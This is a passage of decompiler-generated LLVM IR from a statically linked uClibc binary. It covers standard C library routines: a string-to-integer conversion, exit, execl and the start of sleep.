dec_label_pc_8053e2c:                             ; preds = %dec_label_pc_8053e27
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053e2e = icmp eq i8 %v2_8053e1e.lcssa, 45
  %v1_8053e31 = icmp eq i1 %v9_8053e2e, false
  br i1 %v1_8053e31, label %dec_label_pc_8053e3d, label %dec_label_pc_8053e3c

dec_label_pc_8053e3c:                             ; preds = %dec_label_pc_8053e27, %dec_label_pc_8053e2c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8053e2c ], [ 0, %dec_label_pc_8053e27 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8053e3c = add i32 %v0_8053e1d.lcssa, 1
  store i32 %v1_8053e3c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053e3d

dec_label_pc_8053e3d:                             ; preds = %dec_label_pc_8053e2c, %dec_label_pc_8053e3c
  %v0_8053e4f = phi i32 [ %v0_8053e1d.lcssa, %dec_label_pc_8053e2c ], [ %v1_8053e3c, %dec_label_pc_8053e3c ]
  %v1_8053e3f = and i32 %arg3, -17
  %v2_8053e3f = icmp eq i32 %v1_8053e3f, 0
  %v1_8053e45 = icmp eq i1 %v2_8053e3f, false
  br i1 %v1_8053e45, label %dec_label_pc_8053e6b, label %dec_label_pc_8053e47

dec_label_pc_8053e47:                             ; preds = %dec_label_pc_8053e3d
  %v1_8053e47 = add i32 %arg3, 10
  store i32 %v1_8053e47, i32* %esi.global-to-local, align 4
  %v1_8053e4a = inttoptr i32 %v0_8053e4f to i8*
  %v2_8053e4a = load i8, i8* %v1_8053e4a, align 1
  %v8_8053e4a = icmp eq i8 %v2_8053e4a, 48
  %v1_8053e4d = icmp eq i1 %v8_8053e4a, false
  br i1 %v1_8053e4d, label %dec_label_pc_8053e61, label %dec_label_pc_8053e4f

dec_label_pc_8053e4f:                             ; preds = %dec_label_pc_8053e47
  %v1_8053e4f = add i32 %v0_8053e4f, 1
  store i32 %v1_8053e4f, i32* %ebx.global-to-local, align 4
  %v1_8053e50 = add i32 %arg3, 8
  store i32 %v1_8053e50, i32* %esi.global-to-local, align 4
  %v1_8053e55 = inttoptr i32 %v1_8053e4f to i8*
  %v2_8053e55 = load i8, i8* %v1_8053e55, align 1
  %v3_8053e55 = zext i8 %v2_8053e55 to i32
  %v5_8053e55 = and i32 %v3_8053e1e.lcssa, -256
  %v6_8053e55 = or i32 %v5_8053e55, %v3_8053e55
  %v1_8053e57 = or i32 %v6_8053e55, 32
  %v3_8053e57 = trunc i32 %v1_8053e57 to i8
  store i32 %v1_8053e57, i32* %eax.global-to-local, align 4
  %v10_8053e5a = icmp eq i8 %v3_8053e57, 120
  %v1_8053e5c = icmp eq i1 %v10_8053e5a, false
  br i1 %v1_8053e5c, label %dec_label_pc_8053e61, label %dec_label_pc_8053e5e

dec_label_pc_8053e5e:                             ; preds = %dec_label_pc_8053e4f
  %v2_8053e5e = mul i32 %v1_8053e50, 2
  store i32 %v2_8053e5e, i32* %esi.global-to-local, align 4
  %v1_8053e60 = add i32 %v0_8053e4f, 2
  store i32 %v1_8053e60, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053e61

dec_label_pc_8053e61:                             ; preds = %dec_label_pc_8053e4f, %dec_label_pc_8053e47, %dec_label_pc_8053e5e
  %v0_8053e8a12 = phi i32 [ %v1_8053e4f, %dec_label_pc_8053e4f ], [ %v0_8053e4f, %dec_label_pc_8053e47 ], [ %v1_8053e60, %dec_label_pc_8053e5e ]
  %v0_8053ee120 = phi i32 [ %v1_8053e4f, %dec_label_pc_8053e4f ], [ %v4_8053e11, %dec_label_pc_8053e47 ], [ %v1_8053e4f, %dec_label_pc_8053e5e ]
  %v0_8053e61 = phi i32 [ %v1_8053e50, %dec_label_pc_8053e4f ], [ %v1_8053e47, %dec_label_pc_8053e47 ], [ %v2_8053e5e, %dec_label_pc_8053e5e ]
  %v7_8053e64 = icmp sgt i32 %v0_8053e61, 16
  br i1 %v7_8053e64, label %dec_label_pc_8053e66, label %dec_label_pc_8053e6b

dec_label_pc_8053e66:                             ; preds = %dec_label_pc_8053e61
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053e6b

dec_label_pc_8053e6b:                             ; preds = %dec_label_pc_8053e61, %dec_label_pc_8053e3d, %dec_label_pc_8053e66
  %v0_8053ee121 = phi i32 [ %v0_8053ee120, %dec_label_pc_8053e61 ], [ %v4_8053e11, %dec_label_pc_8053e3d ], [ %v0_8053ee120, %dec_label_pc_8053e66 ]
  %v0_8053e8a13 = phi i32 [ %v0_8053e8a12, %dec_label_pc_8053e61 ], [ %v0_8053e4f, %dec_label_pc_8053e3d ], [ %v0_8053e8a12, %dec_label_pc_8053e66 ]
  %v0_8053e7a = phi i32 [ %v0_8053e61, %dec_label_pc_8053e61 ], [ %arg3, %dec_label_pc_8053e3d ], [ 16, %dec_label_pc_8053e66 ]
  %v1_8053e6b = add i32 %v0_8053e7a, -2
  store i32 %v1_8053e6b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_8053e73 = icmp ugt i32 %v1_8053e6b, 34
  br i1 %v6_8053e73, label %dec_label_pc_8053ed6, label %dec_label_pc_8053e75

dec_label_pc_8053e75:                             ; preds = %dec_label_pc_8053e6b
  %div = udiv i32 -1, %v0_8053e7a
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8053e7a
  %v1_8053e7c = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_8053eb6 = urem i32 %arg4, 256
  br label %dec_label_pc_8053e8a

dec_label_pc_8053e88:                             ; preds = %dec_label_pc_8053ecc, %dec_label_pc_8053eb6
  %v4_8053e8a.pre = phi i32 [ %v1_8053ea0, %dec_label_pc_8053ecc ], [ %v4_8053e8a.pre.pre, %dec_label_pc_8053eb6 ]
  %v0_8053e88 = phi i32 [ %v1_8053ea7, %dec_label_pc_8053ecc ], [ %v0_8053e88.pre, %dec_label_pc_8053eb6 ]
  br label %dec_label_pc_8053e8a

dec_label_pc_8053e8a:                             ; preds = %dec_label_pc_8053e75, %dec_label_pc_8053e88
  %v0_8053ee119 = phi i32 [ %v0_8053ee121, %dec_label_pc_8053e75 ], [ %v0_8053e88, %dec_label_pc_8053e88 ]
  %v0_8053ea7 = phi i32 [ %v0_8053e8a13, %dec_label_pc_8053e75 ], [ %v0_8053e88, %dec_label_pc_8053e88 ]
  %v4_8053e8a = phi i32 [ %div, %dec_label_pc_8053e75 ], [ %v4_8053e8a.pre, %dec_label_pc_8053e88 ]
  %v1_8053e8a = inttoptr i32 %v0_8053ea7 to i8*
  %v2_8053e8a = load i8, i8* %v1_8053e8a, align 1
  %v3_8053e8a = zext i8 %v2_8053e8a to i32
  %v5_8053e8a = and i32 %v4_8053e8a, -256
  %v6_8053e8a = or i32 %v3_8053e8a, %v5_8053e8a
  store i32 %v6_8053e8a, i32* %eax.global-to-local, align 4
  %v1_8053e8c = add i32 %v6_8053e8a, -48
  store i32 %v1_8053e8c, i32* @ecx, align 4
  %v1_8053e8f = trunc i32 %v1_8053e8c to i8
  %tmp55 = icmp ult i8 %v1_8053e8f, 10
  br i1 %tmp55, label %dec_label_pc_8053ea0, label %dec_label_pc_8053e94

dec_label_pc_8053e94:                             ; preds = %dec_label_pc_8053e8a
  %v1_8053e94 = or i32 %v6_8053e8a, 32
  %v3_8053e94 = trunc i32 %v1_8053e94 to i8
  store i32 %v1_8053e94, i32* %eax.global-to-local, align 4
  %v1_8053e97 = and i32 %v1_8053e8c, -256
  %v2_8053e97 = or i32 %v1_8053e97, 40
  store i32 %v2_8053e97, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_8053e94, 97
  br i1 %tmp56, label %dec_label_pc_8053ea0, label %dec_label_pc_8053e9d

dec_label_pc_8053e9d:                             ; preds = %dec_label_pc_8053e94
  %v1_8053e9d = add i32 %v1_8053e94, -87
  store i32 %v1_8053e9d, i32* @ecx, align 4
  br label %dec_label_pc_8053ea0

dec_label_pc_8053ea0:                             ; preds = %dec_label_pc_8053e94, %dec_label_pc_8053e8a, %dec_label_pc_8053e9d
  %v0_8053ecf = phi i32 [ %v2_8053e97, %dec_label_pc_8053e94 ], [ %v1_8053e8c, %dec_label_pc_8053e8a ], [ %v1_8053e9d, %dec_label_pc_8053e9d ]
  %v1_8053ea0 = urem i32 %v0_8053ecf, 256
  store i32 %v1_8053ea0, i32* %eax.global-to-local, align 4
  %v1_8053ea3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053ea3 = sub i32 %v1_8053ea0, %v1_8053ea3
  %v10_8053ea3 = and i32 %v2_8053ea3, %v1_8053ea3
  %v11_8053ea3 = icmp slt i32 %v10_8053ea3, 0
  %v13_8053ea3 = icmp slt i32 %v2_8053ea3, 0
  %v2_8053ea5 = icmp eq i1 %v13_8053ea3, %v11_8053ea3
  br i1 %v2_8053ea5, label %dec_label_pc_8053ed6, label %dec_label_pc_8053ea7

dec_label_pc_8053ea7:                             ; preds = %dec_label_pc_8053ea0
  %v1_8053ea7 = add i32 %v0_8053ea7, 1
  store i32 %v1_8053ea7, i32* %ebx.global-to-local, align 4
  %v0_8053ea8 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_8053ea8, %div
  br i1 %tmp57, label %dec_label_pc_8053eb6, label %dec_label_pc_8053eae

dec_label_pc_8053eae:                             ; preds = %dec_label_pc_8053ea7
  %v15_8053ea8 = icmp eq i32 %v0_8053ea8, %div
  %v1_8053eae = icmp eq i1 %v15_8053ea8, false
  br i1 %v1_8053eae, label %dec_label_pc_8053ecc, label %dec_label_pc_8053eb0

dec_label_pc_8053eb0:                             ; preds = %dec_label_pc_8053eae
  %v1_8053eb0 = trunc i32 %v0_8053ecf to i8
  %tmp58 = icmp ugt i8 %v1_8053eb0, %v1_8053e7c
  br i1 %tmp58, label %dec_label_pc_8053eb6, label %dec_label_pc_8053ecc

dec_label_pc_8053eb6:                             ; preds = %dec_label_pc_8053eb0, %dec_label_pc_8053ea7
  store i32 %v4_8053eb6, i32* %eax.global-to-local, align 4
  %v0_8053eba = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053eba = and i32 %v0_8053eba, %v4_8053eb6
  store i32 %v2_8053eba, i32* %ebp.global-to-local, align 4
  %v1_8053ebc = call i32 @__errno_location(i32 %div)
  store i32 %v1_8053ebc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_8053ec4 = inttoptr i32 %v1_8053ebc to i32*
  store i32 34, i32* %v1_8053ec4, align 4
  %v0_8053e88.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053e8a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e88

dec_label_pc_8053ecc:                             ; preds = %dec_label_pc_8053eb0, %dec_label_pc_8053eae
  %v4_8053ecc = mul i32 %v0_8053ea8, %v1_8053ea3
  store i32 %v1_8053ea0, i32* %eax.global-to-local, align 4
  %v2_8053ed2 = add i32 %v4_8053ecc, %v1_8053ea0
  store i32 %v2_8053ed2, i32* @edx, align 4
  br label %dec_label_pc_8053e88

dec_label_pc_8053ed6:                             ; preds = %dec_label_pc_8053ea0, %dec_label_pc_8053e6b
  %v0_8053ee1 = phi i32 [ %v0_8053ee121, %dec_label_pc_8053e6b ], [ %v0_8053ee119, %dec_label_pc_8053ea0 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_8053e6b ], [ %div, %dec_label_pc_8053ea0 ]
  %v4_8053ed6 = icmp eq i32 %arg2, 0
  br i1 %v4_8053ed6, label %dec_label_pc_8053ee3, label %dec_label_pc_8053edd

dec_label_pc_8053edd:                             ; preds = %dec_label_pc_8053ed6
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053ee1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053ee1, i32* %v2_8053ee1, align 4
  br label %dec_label_pc_8053ee3

dec_label_pc_8053ee3:                             ; preds = %dec_label_pc_8053ed6, %dec_label_pc_8053edd
  %v0_8053ee3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053ee3, i32* %eax.global-to-local, align 4
  %v1_8053ee5 = trunc i32 %v0_8053ee3 to i8
  %v6_8053ee5 = icmp eq i8 %v1_8053ee5, 0
  %v2_8053ee7 = zext i1 %v6_8053ee5 to i32
  %v1_8053ee94 = or i32 %v2_8053ee7, -2147483648
  store i32 %v1_8053ee94, i32* %ebx.global-to-local, align 4
  %v5_8053eef = icmp eq i8 %tmp37, 0
  br i1 %v5_8053eef, label %dec_label_pc_8053f07, label %dec_label_pc_8053ef6

dec_label_pc_8053ef6:                             ; preds = %dec_label_pc_8053ee3
  %v0_8053ef6 = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_8053ef6, %v1_8053ee94
  br i1 %tmp59, label %dec_label_pc_8053efa, label %dec_label_pc_8053f07

dec_label_pc_8053efa:                             ; preds = %dec_label_pc_8053ef6
  %v1_8053efa = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8053efa, i32* %eax.global-to-local, align 4
  %v0_8053eff = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053eff, i32* @edx, align 4
  %v1_8053f01 = inttoptr i32 %v1_8053efa to i32*
  store i32 34, i32* %v1_8053f01, align 4
  %v0_8053f07.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053f07

dec_label_pc_8053f07:                             ; preds = %dec_label_pc_8053ef6, %dec_label_pc_8053ee3, %dec_label_pc_8053efa
  %v0_8053f07 = phi i32 [ %v0_8053ee3, %dec_label_pc_8053ef6 ], [ %v0_8053ee3, %dec_label_pc_8053ee3 ], [ %v0_8053f07.pre, %dec_label_pc_8053efa ]
  store i32 %v0_8053f07, i32* %eax.global-to-local, align 4
  %v3_8053f09 = trunc i32 %v0_8053f07 to i8
  %v4_8053f09 = icmp eq i8 %v3_8053f09, 0
  %v0_8053f12.pre = load i32, i32* @edx, align 4
  br i1 %v4_8053f09, label %dec_label_pc_8053f0f, label %dec_label_pc_8053f0d

dec_label_pc_8053f0d:                             ; preds = %dec_label_pc_8053f07
  %v1_8053f0d = sub i32 0, %v0_8053f12.pre
  store i32 %v1_8053f0d, i32* @edx, align 4
  br label %dec_label_pc_8053f0f

dec_label_pc_8053f0f:                             ; preds = %dec_label_pc_8053f07, %dec_label_pc_8053f0d
  %v0_8053f12 = phi i32 [ %v1_8053f0d, %dec_label_pc_8053f0d ], [ %v0_8053f12.pre, %dec_label_pc_8053f07 ]
  store i32 %v0_8053f12, i32* %eax.global-to-local, align 4
  %v2_8053f14 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053f14, i32* @ebx, align 4
  ret i32 %v0_8053f12

; uselistorder directives
  uselistorder i32 %v0_8053f12, { 1, 0 }
  uselistorder i32 %v0_8053f07, { 1, 0 }
  uselistorder i32 %v0_8053ea8, { 0, 2, 1 }
  uselistorder i32 %v1_8053ea7, { 1, 0 }
  uselistorder i32 %v2_8053ea3, { 1, 0 }
  uselistorder i32 %v1_8053ea0, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053ecf, { 1, 0 }
  uselistorder i32 %v0_8053e88, { 1, 0 }
  uselistorder i32 %v4_8053eb6, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8053e7a, { 1, 0, 2 }
  uselistorder i32 %v2_8053e5e, { 1, 0 }
  uselistorder i32 %v1_8053e57, { 1, 0 }
  uselistorder i32 %v1_8053e50, { 1, 0, 2 }
  uselistorder i32 %v0_8053e4f, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8053e1e.lcssa, { 1, 0 }
  uselistorder i32 %v0_8053e1d.lcssa, { 1, 0 }
  uselistorder i32 %v1_8053e1d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053e11, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8053e0b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 41, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053f0f, { 1, 0 }
  uselistorder label %dec_label_pc_8053f07, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053ee3, { 1, 0 }
  uselistorder label %dec_label_pc_8053ea0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e8a, { 1, 0 }
  uselistorder label %dec_label_pc_8053e6b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e61, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e3d, { 1, 0 }
  uselistorder label %dec_label_pc_8053e3c, { 1, 0 }
  uselistorder label %dec_label_pc_8053e1d, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053f2f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053f2f, i32* @ebx, align 4
  %v2_8053f34 = call i32 @__pthread_return_void(i32 %v2_8053f2f, i32 134562611)
  %v1_8053f40 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b4e0.526 to i32))
  %v0_8053f45 = load i32, i32* @global_var_8061784.527, align 4
  store i32 %v0_8053f45, i32* @eax, align 4
  %v1_8053f4d = icmp eq i32 %v0_8053f45, 0
  br i1 %v1_8053f4d, label %dec_label_pc_8053f5a, label %dec_label_pc_8053f51

dec_label_pc_8053f51:                             ; preds = %entry
  %v0_8053f54 = load i32, i32* @esi, align 4
  %v1_8053f55 = call i32 @unknown_0(i32 %v0_8053f54)
  store i32 %v1_8053f55, i32* @eax, align 4
  br label %dec_label_pc_8053f5a

dec_label_pc_8053f5a:                             ; preds = %entry, %dec_label_pc_8053f51
  %v2_8053f5f = call i32 @__pthread_return_void(i32 %v2_8053f2f, i32 1)
  %v0_8053f64 = call i32 @__GI___uClibc_fini()
  %v0_8053f75 = call i32 @_stdio_term()
  %v0_8053f7d = load i32, i32* @esi, align 4
  %v1_8053f7e = call i32 @__GI__exit(i32 %v0_8053f7d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 4, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_8053f5a, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053f88 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f88, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8053f8b = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053f8b, i32* %eax.global-to-local, align 4
  %v12_8053f8e = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053f94

dec_label_pc_8053f94:                             ; preds = %dec_label_pc_8053f94, %entry
  %v0_8053f97 = phi i32 [ 0, %entry ], [ %v1_8053f97, %dec_label_pc_8053f94 ]
  %stack_var_-16.0 = phi i32 [ %v2_8053f8b, %entry ], [ %v1_8053f98, %dec_label_pc_8053f94 ]
  %v1_8053f97 = add i32 %v0_8053f97, 1
  store i32 %v1_8053f97, i32* %esi.global-to-local, align 4
  %v1_8053f98 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053f98, i32* %eax.global-to-local, align 4
  %v1_8053f9e = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053f9e = load i32, i32* %v1_8053f9e, align 4
  %v3_8053f9e = icmp eq i32 %v2_8053f9e, 0
  %v1_8053fa1 = icmp eq i1 %v3_8053f9e, false
  br i1 %v1_8053fa1, label %dec_label_pc_8053f94, label %dec_label_pc_8053fa3

dec_label_pc_8053fa3:                             ; preds = %dec_label_pc_8053f94
  %v1_8053fa3 = mul i32 %v1_8053f97, 4
  %v2_8053fa3 = add i32 %v1_8053fa3, 34
  %v1_8053faa = and i32 %v2_8053fa3, -16
  %v2_8053fad = sub i32 %v12_8053f8e, %v1_8053faa
  %v1_8053fb2 = add i32 %v2_8053fad, 15
  %v1_8053fb6 = and i32 %v1_8053fb2, -16
  store i32 %v1_8053fb6, i32* @ebx, align 4
  store i32 %v1_8053fb6, i32* %ecx.global-to-local, align 4
  %v2_8053fbb = inttoptr i32 %v1_8053fb6 to i32*
  store i32 %arg2, i32* %v2_8053fbb, align 16
  store i32 %v2_8053f8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fc3

dec_label_pc_8053fc3:                             ; preds = %dec_label_pc_8053fc3, %dec_label_pc_8053fa3
  %stack_var_-16.1 = phi i32 [ %v2_8053f8b, %dec_label_pc_8053fa3 ], [ %v1_8053fca, %dec_label_pc_8053fc3 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053fc6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053fc6 = add i32 %v0_8053fc6, 4
  store i32 %v1_8053fc6, i32* %ecx.global-to-local, align 4
  %v0_8053fc9 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053fc9 = add i32 %v0_8053fc9, -1
  %v8_8053fc9 = icmp eq i32 %v1_8053fc9, 0
  store i32 %v1_8053fc9, i32* %esi.global-to-local, align 4
  %v1_8053fca = add i32 %stack_var_-16.1, 4
  %v1_8053fd0 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8053fd0 = load i32, i32* %v1_8053fd0, align 4
  store i32 %v2_8053fd0, i32* %eax.global-to-local, align 4
  %v2_8053fd2 = inttoptr i32 %v1_8053fc6 to i32*
  store i32 %v2_8053fd0, i32* %v2_8053fd2, align 4
  %v1_8053fd4 = icmp eq i1 %v8_8053fc9, false
  br i1 %v1_8053fd4, label %dec_label_pc_8053fc3, label %dec_label_pc_8053fd6

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053fc3
  %v0_8053fd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fd6 = load i32, i32* @esp, align 4
  %v2_8053fd6 = add i32 %v1_8053fd6, -4
  %v3_8053fd6 = inttoptr i32 %v2_8053fd6 to i32*
  store i32 %v0_8053fd6, i32* %v3_8053fd6, align 4
  %v0_8053fd7 = load i32, i32* @global_var_806178c.528, align 4
  %v2_8053fd7 = add i32 %v1_8053fd6, -8
  %v3_8053fd7 = inttoptr i32 %v2_8053fd7 to i32*
  store i32 %v0_8053fd7, i32* %v3_8053fd7, align 4
  %v0_8053fdd = load i32, i32* @ebx, align 4
  %v2_8053fdd = add i32 %v1_8053fd6, -12
  %v3_8053fdd = inttoptr i32 %v2_8053fdd to i32*
  store i32 %v0_8053fdd, i32* %v3_8053fdd, align 4
  %v5_8053fde = add i32 %v1_8053fd6, -16
  %v6_8053fde = inttoptr i32 %v5_8053fde to i32*
  store i32 %arg1, i32* %v6_8053fde, align 4
  %v1_8053fe1 = inttoptr i32 %v1_8053fca to i8*
  %v2_8053fe1 = call i32 @__GI_execve(i8* %v1_8053fe1)
  store i32 %v2_8053fe1, i32* %eax.global-to-local, align 4
  %v2_8053fe9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053fe9, i32* @ebx, align 4
  ret i32 %v2_8053fe1

; uselistorder directives
  uselistorder i32 %v1_8053fc9, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053f98, { 1, 0 }
  uselistorder i32 %v1_8053f97, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053f8b, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053ff1 = load i32, i32* @edi, align 4
  %v0_8053ff2 = load i32, i32* @esi, align 4
  %v0_8053ff3 = load i32, i32* @ebx, align 4
  %v15_8053ff4 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8054006 = icmp eq i32 %arg1, 0
  %v1_8054008 = icmp eq i1 %v1_8054006, false
  br i1 %v1_8054008, label %dec_label_pc_805401a.preheader, label %dec_label_pc_8054167

dec_label_pc_805401a.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805400f

dec_label_pc_805400f:                             ; preds = %dec_label_pc_805400f.dec_label_pc_805400f_crit_edge, %dec_label_pc_805401a.preheader
  %v0_805400f = phi i32 [ %v15_8053ff4, %dec_label_pc_805401a.preheader ], [ %v0_805400f.pre, %dec_label_pc_805400f.dec_label_pc_805400f_crit_edge ]
  %v1_805401a27 = phi i32 [ 31, %dec_label_pc_805401a.preheader ], [ %v1_805401a, %dec_label_pc_805400f.dec_label_pc_805400f_crit_edge ]
  %v2_805400f = mul i32 %v1_805401a27, 4
  %v3_805400f = add i32 %v2_805400f, 292
  %v4_805400f = add i32 %v3_805400f, %v0_805400f
  %v5_805400f = inttoptr i32 %v4_805400f to i32*
  store i32 0, i32* %v5_805400f, align 4
  %v0_805401a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805401a = add i32 %v0_805401a.pre, -1
  %v9_805401a = icmp slt i32 %v1_805401a, 0
  store i32 %v1_805401a, i32* %eax.global-to-local, align 4
  %v1_805401b = icmp eq i1 %v9_805401a, false
  br i1 %v1_805401b, label %dec_label_pc_805400f.dec_label_pc_805400f_crit_edge, label %dec_label_pc_805401d

dec_label_pc_805400f.dec_label_pc_805400f_crit_edge: ; preds = %dec_label_pc_805400f
  %v0_805400f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805400f

dec_label_pc_805401d:                             ; preds = %dec_label_pc_805400f
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8054033 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8054033, i32* @ebx, align 4
  store i32 %v2_8054033, i32* %stack_var_-460, align 4
  %v4_805403b = call i32 @__sigaddset(i32 %v2_8054033, i32 17, i32 %v1_805401a, i32 %v1_805401a)
  store i32 %v4_805403b, i32* %eax.global-to-local, align 4
  %v2_8054043 = icmp slt i32 %v4_805403b, 0
  br i1 %v2_8054043, label %dec_label_pc_805416b, label %dec_label_pc_805404b

dec_label_pc_805404b:                             ; preds = %dec_label_pc_805401d
  %v2_805404c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805404c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8054057 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8054057 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8054057, i32 %v2_805404c)
  store i32 %v4_8054057, i32* %eax.global-to-local, align 4
  %v1_805405f = icmp eq i32 %v4_8054057, 0
  %v1_8054061 = icmp eq i1 %v1_805405f, false
  br i1 %v1_8054061, label %dec_label_pc_805416b, label %dec_label_pc_8054067

dec_label_pc_8054067:                             ; preds = %dec_label_pc_805404b
  store i32 %v2_805404c, i32* %stack_var_-460, align 4
  %v4_805406c = call i32 @__sigismember(i32 %v2_805404c, i32 17, i32 %v4_8054057, i32 %v4_8054057)
  store i32 %v4_805406c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8054079 = icmp eq i32 %v4_805406c, 0
  br i1 %v1_8054079, label %dec_label_pc_805408d.preheader, label %dec_label_pc_8054135

dec_label_pc_805408d.preheader:                   ; preds = %dec_label_pc_8054067
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054082

dec_label_pc_8054082:                             ; preds = %dec_label_pc_8054082.dec_label_pc_8054082_crit_edge, %dec_label_pc_805408d.preheader
  %v0_8054082 = phi i32 [ %v15_8053ff4, %dec_label_pc_805408d.preheader ], [ %v0_8054082.pre, %dec_label_pc_8054082.dec_label_pc_8054082_crit_edge ]
  %v1_805408d26 = phi i32 [ 31, %dec_label_pc_805408d.preheader ], [ %v1_805408d, %dec_label_pc_8054082.dec_label_pc_8054082_crit_edge ]
  %v2_8054082 = mul i32 %v1_805408d26, 4
  %v3_8054082 = add i32 %v2_8054082, 292
  %v4_8054082 = add i32 %v3_8054082, %v0_8054082
  %v5_8054082 = inttoptr i32 %v4_8054082 to i32*
  store i32 0, i32* %v5_8054082, align 4
  %v0_805408d.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_805408d = add i32 %v0_805408d.pre, -1
  %v9_805408d = icmp slt i32 %v1_805408d, 0
